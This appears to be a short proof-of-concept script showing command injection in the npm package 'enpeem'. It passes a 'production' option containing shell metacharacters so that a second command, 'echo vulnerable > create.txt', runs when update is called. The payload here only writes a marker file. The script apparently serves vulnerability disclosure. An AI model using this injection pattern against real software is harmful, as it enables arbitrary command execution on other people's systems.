var root = require("enpeem");
var attack_code = "& echo vulnerable > create.txt &";
var opts = {
  "production": attack_code
}
root.update(opts, function(){});
